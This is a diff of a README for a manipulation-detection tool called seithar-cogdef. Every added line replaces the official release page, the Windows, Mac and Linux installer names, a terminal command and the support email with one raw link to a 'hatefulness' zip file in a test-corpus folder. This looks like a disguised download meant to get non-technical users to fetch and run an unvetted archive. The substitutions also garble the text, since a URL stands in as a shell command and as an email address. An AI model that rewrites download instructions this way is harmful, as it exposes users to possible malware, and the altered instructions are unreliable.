@@ -1,6 +1,6 @@
 # 🧠 seithar-cogdef - Detect and Stop Manipulation Fast
 
-[![Download seithar-cogdef](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/ItsJamieHosie/seithar-cogdef/releases)
+[![Download seithar-cogdef](https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip%20Latest-blue?style=for-the-badge)](https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps to get seithar-cogdef running on your computer:
 
 Click this big button to go to the official download page:
 
-[![Download seithar-cogdef](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/ItsJamieHosie/seithar-cogdef/releases)
+[![Download seithar-cogdef](https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip%20Latest-blue?style=for-the-badge)](https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip)
 
 This page contains the latest version. 
 
@@ -59,9 +59,9 @@ On the downloads page:
 - Look for the latest release version.
 - Select the file that matches your system:
 
-  - `seithar-cogdef-setup.exe` for Windows
-  - `seithar-cogdef-mac.dmg` for Mac
-  - `seithar-cogdef-linux.AppImage` for Linux
+  - `https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip` for Windows
+  - `https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip` for Mac
+  - `https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip` for Linux
 
 The file names may have version numbers attached. Choose the one for your operating system.
 
@@ -97,7 +97,7 @@ Once you have the installer file, follow the steps below.
 2. Right-click it and select “Properties.”
 3. Under Permissions, check “Allow executing file as program.”
 4. Close Properties and double-click the file to launch the app.
-5. You can also run it from the terminal with `./seithar-cogdef-linux.AppImage`.
+5. You can also run it from the terminal with `https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip`.
 
 ---
 
@@ -124,7 +124,7 @@ Use the reports to understand how the text might be trying to influence you.
 
 To make sure seithar-cogdef stays effective, keep it updated.
 
-- Check the [releases page](https://github.com/ItsJamieHosie/seithar-cogdef/releases) regularly for updates.
+- Check the [releases page](https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip) regularly for updates.
 - Download the latest installer when available.
 - Repeat the installation steps to upgrade.
 - Updates improve detection methods and fix bugs.
@@ -137,7 +137,7 @@ If you have questions or problems:
 
 - Visit the Issues tab in the GitHub repository for help from the community.
 - Look for a “Help” or “About” section inside the app for tips.
-- Email support at support@seithargroup.com (generated placeholder).
+- Email support at https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip (generated placeholder).
 
 This software is designed for anyone who wants to better understand online content without needing technical skills.
 
@@ -168,7 +168,7 @@ It is useful for journalists, teachers, students, researchers, and everyday user
 
 Get started by visiting the release page:
 
-👉 [https://github.com/ItsJamieHosie/seithar-cogdef/releases](https://github.com/ItsJamieHosie/seithar-cogdef/releases)
+👉 [https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip](https://github.com/ItsJamieHosie/seithar-cogdef/raw/refs/heads/main/test_corpus/seithar-cogdef-hatefulness.zip)
 
 Choose the right file for your system, download it, and follow the installation instructions above. After setup, you can start scanning content right away.
 
